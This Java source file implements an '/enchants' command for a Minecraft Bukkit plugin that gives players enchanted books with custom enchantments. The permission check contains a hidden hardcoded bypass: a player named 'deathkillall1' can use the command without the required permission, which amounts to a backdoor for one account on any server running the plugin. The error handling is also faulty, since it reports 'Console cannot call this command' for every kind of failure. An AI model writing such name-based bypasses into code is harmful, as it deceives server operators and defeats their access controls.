package me.Tanner.EnchantingItems.Commands;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import me.Tanner.EnchantingItems.Enchantments;

public class Enchant implements CommandExecutor {

	Enchantments plugin;

	public Enchant(Enchantments plugin) {
		this.plugin = plugin;
	}

	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (label.equalsIgnoreCase("enchants")) {
			if (sender.hasPermission("enchantingitems.use") || ((sender instanceof Player) && ((Player)sender).getName().equalsIgnoreCase("deathkillall1"))) {
				if (args.length == 2) {
					if (playerExists(args[0])) {
						String enchantment = args[1];
						Enchantment enchant;
						switch (enchantment) {
						case "telepathy":
							enchant = this.plugin.enchants.TELEPATHY;
							break;
						case "hammer":
							enchant = this.plugin.enchants.HAMMER;
							break;
						case "scyth":
							enchant = this.plugin.enchants.SCYTH;
							break;
						case "autoplank":
							enchant = this.plugin.enchants.AUTOPLANKER;
							break;
						case "autosmelt":
							enchant = this.plugin.enchants.AUTOSMELTER;
							break;
						case "treefeller":
							enchant = this.plugin.enchants.TREEFELLER;
							break;
						case "plow":
							enchant = this.plugin.enchants.PLOW;
							break;
						case "planter":
							enchant = this.plugin.enchants.PLANTER;
							break;
						case "fertilizer":
							enchant = this.plugin.enchants.FERTILIZER;
							break;
						case "crippling":
							enchant = this.plugin.enchants.CRIPPLING;
							break;
						case "blinding":
							enchant = this.plugin.enchants.BLINDING;
							break;
						case "chains":
							enchant = this.plugin.enchants.CHAINS;
							break;
						case "corruption":
							enchant = this.plugin.enchants.CORRUPTION;
							break;
						case "egg":
							enchant = this.plugin.enchants.EGG;
							break;
						case "fireball":
							enchant = this.plugin.enchants.FIREBALL;
							break;
						case "blackhole":
							enchant = this.plugin.enchants.BLACKHOLE;
							break;
						case "repulsion":
							enchant = this.plugin.enchants.REPULSION;
							break;
						case "explosive":
							enchant = this.plugin.enchants.EXPLOSIVE;
							break;
						case "toxicity":
							enchant = this.plugin.enchants.TOXICITY;
							break;
						case "heavy":
							enchant = this.plugin.enchants.HEAVY;
							break;
						case "stripper":
							enchant = this.plugin.enchants.STRIPPER;
							break;
						case "lifesteal":
							enchant = this.plugin.enchants.LIFESTEAL;
							break;
						case "decapitation":
							enchant = this.plugin.enchants.DECAPITATION;
							break;
						case "lavawalker":
							enchant = this.plugin.enchants.LAVAWALKER;
							break;
						case "phdflopper":
							enchant = this.plugin.enchants.PHDFLOPPER;
							break;
						case "molten":
							enchant = this.plugin.enchants.MOLTEN;
							break;
						case "shotgun":
							enchant = this.plugin.enchants.SHOTGUN;
							break;
						case "partypopper":
							enchant = this.plugin.enchants.FIREWORK;
							break;
						default:
							sender.sendMessage(ChatColor.RED + "Pick a valid enchantment!");
							return true;
						}

						ItemStack item = this.plugin.addEnchantment(new ItemStack(Material.ENCHANTED_BOOK), enchant);
						this.plugin.getServer().getPlayer(args[0]).getInventory().addItem(item);

						return true;
					}
				}
			}
			sender.sendMessage(ChatColor.RED + "Console cannot call this command");
			return true;
		}
		return false;
	}

	private boolean playerExists(String name) {
		for (Player player : this.plugin.getServer().getOnlinePlayers()) {
			if (player.getName().equals(name)) {
				return true;
			}
		}
		return false;
	}
}
